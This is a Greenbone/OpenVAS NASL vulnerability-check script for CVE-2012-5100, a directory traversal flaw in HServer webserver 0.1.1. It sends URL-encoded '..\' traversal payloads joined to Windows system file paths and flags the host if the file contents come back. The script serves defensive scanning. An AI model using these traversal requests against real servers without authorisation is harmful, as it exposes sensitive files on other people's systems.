if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802410" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2012-5100" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-01-06 13:10:29 +0530 (Fri, 06 Jan 2012)" );
	script_name( "HServer Webserver Multiple Directory Traversal Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/521119" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/108376/hserverwebserver-traversal.txt" );
	script_xref( name: "URL", value: "https://github.com/lpicanco/hserver" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 8081 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_mandatory_keys( "Host/runs_windows" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to obtain sensitive
  information that could aid in further attacks." );
	script_tag( name: "affected", value: "HServer webserver version 0.1.1" );
	script_tag( name: "insight", value: "The flaws are due to improper validation of URI containing
  '..\\..\\' sequences, which allows attackers to read arbitrary files via directory traversal attacks." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running HServer Webserver and is prone to multiple
  directory traversal vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 8081 );
files = traversal_files( "Windows" );
exploits = make_list( "/..%5c..%5c..%5c",
	 "/%2e%2e%5c%2e%2e%5c%2e%2e%5c" );
for exploit in exploits {
	for pattern in keys( files ) {
		file = files[pattern];
		url = exploit + file;
		if(http_vuln_check( port: port, url: url, pattern: pattern )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 0 );

